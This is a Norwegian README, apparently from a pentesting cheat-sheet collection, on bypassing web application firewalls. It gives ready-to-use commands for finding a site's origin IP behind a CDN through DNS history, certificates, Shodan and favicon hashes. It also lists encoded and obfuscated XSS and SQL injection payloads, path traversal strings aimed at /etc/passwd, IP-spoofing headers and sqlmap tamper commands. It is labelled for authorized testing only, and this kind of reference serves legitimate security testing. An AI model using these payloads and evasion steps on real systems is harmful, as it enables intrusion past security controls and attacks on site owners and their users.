# 🛡️ Hurtigreferanse for omgåelse av WAF

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗ █████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██║    ██║██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║ █╗ ██║███████║█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██║███╗██║██╔══██║██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚███╔███╔╝██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
   ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
   Omgåelse av brannmur for webapplikasjoner
```

---

> **Begreper og presisering:** WAF er en brannmur for webapplikasjoner; origin er serveren bak proxy/CDN. En funnet IP-adresse, et sertifikattreff eller likt innhold beviser ikke alene eierskap, tillatt testomfang eller en omgåelse. MD5 og Shodans viste favicon-hash er forskjellige beregninger. Koding, nullbyte, store/små bokstaver og headerendringer avhenger av dekoding, parser og konfigurasjon; de er ikke universelle omgåelser. Sekvensene merket UTF-8 er historiske overlong-varianter, ikke gyldig moderne UTF-8. Eksemplene er bevart; en beskyttet opprinnelsesserver kan avvise direkte trafikk, se [Cloudflares veiledning](https://developers.cloudflare.com/fundamentals/security/protect-your-origin-server/).


## 🎯 Hva er omgåelse av WAF?

**Omgåelse av WAF** omfatter teknikker som penetrasjonstestere bruker for å passere brannmurer for webapplikasjoner og nå den egentlige serveren eller levere payloads.

### Vanlige WAF-er
- Cloudflare
- AWS WAF
- Akamai
- Imperva/Incapsula
- ModSecurity
- F5 BIG-IP
- Fortinet FortiWeb
- Sucuri

---

## 🔍 Identifikasjon av WAF

### wafw00f
```bash
# Identifiser WAF
wafw00f https://target.com

# Detaljerte utdata
wafw00f https://target.com -v

# Test alle WAF-signaturer
wafw00f https://target.com -a
```

### Manuell identifikasjon
```bash
# Kontroller responsheadere
curl -I https://target.com

# Se etter:
# - Server: cloudflare
# - X-Sucuri-ID
# - X-CDN: Incapsula
# - cf-ray (Cloudflare)
```

---

## 🌐 Finne opprinnelsesserverens IP-adresse

### DNS-historikk
```bash
# Tjenester som kan undersøkes:
# - SecurityTrails.com
# - ViewDNS.info/iphistory
# - DNSHistory.org
# - CompleteDNS.com

# SecurityTrails API
curl "https://api.securitytrails.com/v1/history/target.com/dns/a" \
  -H "APIKEY: YOUR_KEY"
```

### Søk etter TLS-sertifikater
```bash
# Søk etter sertifikater på Censys.io
# Se etter: target.com i sertifikatet

# crt.sh – Certificate Transparency
curl "https://crt.sh/?q=target.com&output=json" | jq

# Censys CLI
censys search "parsed.names: target.com"
```

### Shodan/Censys
```bash
# Shodan
shodan search "ssl:target.com"
shodan search "hostname:target.com"

# Shodan – finn ved hjelp av sertifikatets hash
shodan search "ssl.cert.fingerprint:XXXX"

# Censys
# Søk: services.tls.certificates.leaf_data.subject.common_name: target.com
```

### E-postheadere
```bash
# Abonner på nyhetsbrev eller varsler
# Undersøk e-postheadere for opprinnelsesserverens IP-adresse

# Se etter:
# Received: from [ORIGIN_IP]
# X-Originating-IP: [ORIGIN_IP]
```

### Underdomener uten CDN
```bash
# Finn underdomener
subfinder -d target.com -o subs.txt

# Undersøk hvilke som ligger bak et CDN
cat subs.txt | httpx -ip

# Se etter:
# - mail.target.com
# - ftp.target.com
# - dev.target.com
# - staging.target.com
# - api-internal.target.com
# - vpn.target.com
```

### Hash av nettstedsikonet (favicon)
```bash
# Hent hash av nettstedsikonet
curl -s https://target.com/favicon.ico | md5sum

# Søk i Shodan med favicon-hash
python3 -c "import mmh3,requests,codecs; print(mmh3.hash(codecs.encode(requests.get('https://target.com/favicon.ico').content,'base64')))"

# Shodan-søk
shodan search "http.favicon.hash:HASH_VALUE"
```

### Omgåelse via IPv6
```bash
# WAF-en dekker kanskje ikke IPv6
dig AAAA target.com
curl -g "http://[IPv6_ADDRESS]/" -H "Host: target.com"
```

### IP-områder hos skyleverandører
```bash
# Hent IP-områdene til skyleverandørene
# AWS: https://ip-ranges.amazonaws.com/ip-ranges.json
# Azure: https://www.microsoft.com/en-us/download/details.aspx?id=56519
# GCP: https://www.gstatic.com/ipranges/cloud.json

# En IP-adresse utenfor skyområdene kan være en mulig opprinnelsesserver
```

---

## 🔓 Omgåelse ved å kode payloads

### URL-koding
```
# Enkel koding
<script> → %3Cscript%3E

# Dobbel koding
<script> → %253Cscript%253E

# Blandet
<script> → %3Cscr%69pt%3E
```

### Unicode-koding
```
# UTF-8
<script> → %C0%BC%73%63%72%69%70%74%C0%BE

# Unicode-escape-sekvenser
<script> → \u003cscript\u003e

# HTML-tegnreferanser
<script> → &#60;script&#62;
<script> → &#x3c;script&#x3e;
```

### Variasjon av store og små bokstaver
```
<script> → <ScRiPt>
<script> → <SCRIPT>
SELECT → SeLeCt
UNION → UnIoN
```

### Nullbyte
```
# Injeksjon av nullbyte
<scri%00pt>
<script%00>alert(1)</script>
SEL%00ECT
```

### Kommentarer
```sql
# SQL-kommentarer
SEL/**/ECT
UNION/**/SELECT
UN/**/ION/**/SE/**/LECT

# Kommentarer inne i uttrykket
SELECT/*comment*/FROM
1'/**/OR/**/1=1--
```

### Alternativer til mellomrom
```sql
# Tabulator, linjeskift og vognretur
SELECT%09FROM
SELECT%0AFROM
SELECT%0DFROM

# Plusstegn
UNION+SELECT
1'+OR+1=1--
```

---

## 🔥 WAF-spesifikke omgåelser

### Omgåelse med XSS
```html
# Standardvarianten blir blokkert
<script>alert(1)</script>

# Alternative varianter
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

# Uten parenteser
<img src=x onerror=alert`1`>
<img src=x onerror=alert&lpar;1&rpar;>

# Uten alert
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Omgåelse med SQLi
```sql
# Omgåelse med UNION
UNION SELECT → UNION ALL SELECT
UNION SELECT → /*!50000UNION*/ SELECT
UNION SELECT → %55nion %53elect
UNION SELECT → uNioN sEleCt

# Omgåelse med kommentarer
-- → #
-- → --+
-- → --%00
-- → /**/

# Logiske varianter
OR 1=1 → OR 2=2
OR 1=1 → OR 'a'='a'
OR 1=1 → || 1=1
AND 1=1 → && 1=1

# Versjonsspesifikke kommentarer (MySQL)
/*!50000SELECT*/ → Kjøres bare hvis MySQL >= 5.0
```

### Omgåelse ved katalogtraversering
```
../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252F..%252Fetc/passwd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

---

## 🛠️ HTTP-teknikker

### Dupliserte HTTP-parametere (parameter pollution)
```http
# Dupliserte parametere
?id=1&id=2
?id=1&ID=2

# Injeksjon av tabellverdier
?id[]=1&id[]=2
?id=1&id=2&id=3
```

### Endring av HTTP-metode
```bash
# Endre metode
curl -X POST → curl -X PUT
curl -X GET → curl -X TRACE

# Headere som overstyrer metode
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

### Endring av headere
```http
# Headere for forfalskning av IP-adresse
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Tvetydig Content-Type
Content-Type: application/json
Content-Type: text/plain
Content-Type: application/xml
```

### Chunked-overføringskoding
```http
Transfer-Encoding: chunked

4
test
0
```

---

## 🛠️ Verktøy

| Verktøy | Formål |
|------|---------|
| **wafw00f** | Identifikasjon av WAF |
| **CloudFlair** | Finner opprinnelsesserver bak Cloudflare |
| **Bypass-Firewalls-by-DNS-History** | Søk i DNS-historikk |
| **WhatWaf** | Identifikasjon og omgåelse av WAF |
| **sqlmap --tamper** | Skript for SQLi-omgåelse |

### sqlmap-skript for endring av payloads
```bash
# Bruk tamper-skript
sqlmap -u "http://target.com/id=1" --tamper=space2comment
sqlmap -u "http://target.com/id=1" --tamper=randomcase
sqlmap -u "http://target.com/id=1" --tamper=between

# Flere tamper-skript
sqlmap -u "http://target.com/id=1" --tamper=space2comment,randomcase
```

---

## 📊 Hurtigreferanse

| Teknikk | Bruksområde |
|-----------|----------|
| DNS-historikk | Finn opprinnelsesserverens IP-adresse |
| Sertifikatsøk | Sertifikatsøk i Censys/Shodan |
| Kartlegging av underdomener | Finn underdomener uten CDN |
| Koding | Omgå filtre |
| Variasjon av store og små bokstaver | Omgå enkle regler |
| Kommentarer | Del opp nøkkelord |

---

## 📚 Ressurser

- [PayloadsAllTheThings WAF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [HackTricks WAF](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass)
- [OWASP WAF Bypass](https://owasp.org/www-community/attacks/Bypass_Web_Application_Firewall)

---

<p align="center">
  <b>🛡️ Undersøk omgåelse av WAF!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
